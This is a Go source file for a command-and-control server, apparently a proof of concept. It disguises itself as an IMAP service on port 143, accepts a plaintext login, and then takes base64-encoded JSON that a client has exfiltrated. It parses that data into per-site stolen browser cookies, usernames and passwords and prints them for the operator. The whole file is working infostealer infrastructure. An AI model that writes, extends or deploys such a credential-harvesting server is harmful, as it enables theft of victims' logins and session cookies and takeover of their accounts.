package c2

import (
	"bufio"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"log"
	"net"
	"os"
	"strings"
)

func ListenForIMAP() {
	listener, err := net.Listen("tcp", ":143")
	if err != nil {
		log.Fatal(err)
	}

	defer listener.Close()

	log.Println("SIMAP Server listening on port 143")

	for {
		conn, err := listener.Accept()
		if err != nil {
			log.Printf("Failed to accept connection, %v\n", err)
			continue
		}

		go handleConnection(conn)
	}
}

func handleConnection(conn net.Conn) {
	defer conn.Close()

	reader := bufio.NewReader(conn)
	writer := bufio.NewWriter(conn)

	authenticated := false

	for {
		line, err := reader.ReadString('\n')
		if err != nil {
			// log.Printf("Error reading from connection, %v\n", err)
			return
		}

		// log.Printf("Received command: %v", line)
		cmd, args := parseCommand(line)

		if cmd == "LOGIN" && !authenticated {
			authenticated = processLogin(args, writer)
		} else if cmd == "PROCESSDATA" && authenticated {
			processData(args, writer)
		} else {
			sendResponse(writer, "BAD Command unrecognised or not allowed.")
		}
	}
}

func sendResponse(writer *bufio.Writer, message string) {
	writer.WriteString(message + "\r\n")
	writer.Flush()
}

func parseCommand(line string) (string, string) {
	parts := strings.SplitN(line, " ", 2)
	if len(parts) != 2 {
		return "", ""
	}
	return strings.ToUpper(strings.TrimSpace(parts[0])), strings.TrimSpace(parts[1])
}

/*
To process the login, set the following environment variables on your local machine (or use docker preconfigured)
in order to have credentials you may login with via plaintext.
*/
func processLogin(args string, writer *bufio.Writer) bool {
	// extract username and password
	credentials := strings.Fields(args)
	if len(credentials) != 2 {
		sendResponse(writer, "BAD Invalid arguments for LOGIN")
		return false
	}

	// log.Printf("Login attempt with args: %s", args)

	// set local variables from args into func
	username, password := credentials[0], credentials[1]

	// get environment variables
	validUsername := os.Getenv("simap_poc_username")
	validPassword := os.Getenv("simap_poc_password")

	if validUsername == "" || validPassword == "" {
		log.Fatal("Username or password env variable not set. If it is set, reload your shell / session.")
	}

	if username == validUsername && password == validPassword {
		sendResponse(writer, "OK LOGIN successful")
		return true
	} else {
		sendResponse(writer, "BAD LOGIN invalid username/password")
		return false
	}
}

func processData(args string, writer *bufio.Writer) {
	decoded, err := base64.StdEncoding.DecodeString(args)
	if err != nil {
		sendResponse(writer, "BAD Error in decoding base64 data")
		return
	}

	// search for first instance of {" indicating start of json object in input string from client
	dataString := string(decoded)
	jsonStartingIndex := strings.Index(dataString, "{\"")
	if jsonStartingIndex == -1 {
		sendResponse(writer, "BAD Error in finding json substring, probably empty.")
		return
	}

	// process the JSON in an easy to use format for the c2 operator
	jsonString := dataString[jsonStartingIndex:]
	var jsonObject map[string]interface{}

	err = json.Unmarshal([]byte(jsonString), &jsonObject)
	if err != nil {
		fmt.Println("BAD Error in parsing JSON ", err)
		sendResponse(writer, "BAD Error in parsing JSON")
		return
	}

	// now we have the key:value pairs, split the substrings based on ; and ||| delimiters

	for site, value := range jsonObject {

		// fmt.Printf("Raw data for %v, data: %v\n", site, value)

		valueStr, ok := value.(string)
		if !ok {
			log.Printf("Error - Value for key %v is not a string, skipping. Value is: %v\n", site, value)
			continue
		}

		// these should match the client constants
		// variable names the same in server and client
		const TERMINATOR = ";>|;}|;|£ "
		const KEY_VAL_DELIM = "|<£||>"

		// split the substrings by ";"
		substrings := strings.Split(valueStr, TERMINATOR)

		for _, substring := range substrings {

			// trim whitespace to help out with less errors in the below parsing
			// helps to prevent splitting when we have no more ||| to split on
			trimmedSubstring := strings.TrimSpace(substring)
			if trimmedSubstring == "" {
				continue
			}

			// now split on ||| to pull out cookie name / username ||| value / password
			parts := strings.Split(substring, KEY_VAL_DELIM)

			// handle errors
			if len(parts) == 0 || len(parts) == 1 && parts[0] == "" {
				continue
			} else if len(parts) != 2 {
				// handle errors where a semicolon is found within the body of a string, e.g. in a password - this will cause
				// the function to chop up the password as substrings
				log.Printf("Invalid format: expected 2 parts but found %d in substring '%s', parts: %v\n", len(parts), substring, parts)
				continue
			}

			// print left and right part
			fmt.Printf("Site: %s, Cookie name / username: %s, Cookie value / password: %s\n", site, parts[0], parts[1])
		}

		// console formatting
		fmt.Println()

	}

	fmt.Println()
	fmt.Println()
	fmt.Println("Summary of sites data extracted for:")

	for key := range jsonObject {
		fmt.Println(key)
	}

	// log.Printf("\n\n*****************\nProcessed data:\n%v\n", string(decoded))
	sendResponse(writer, "OK Data processed")
}
